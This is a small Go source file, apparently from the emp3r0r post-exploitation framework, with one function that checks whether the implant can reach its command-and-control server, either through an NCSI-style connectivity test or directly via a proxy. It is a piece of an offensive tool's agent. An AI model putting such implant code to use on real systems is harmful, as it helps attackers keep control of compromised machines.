package main

import (
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

func isC2Reachable() bool {
	if common.RuntimeConfig.EnableNCSI {
		return transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
	}

	logging.Println("NCSI is disabled, trying direct C2 connection")
	return transport.TestConnectivity(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
}
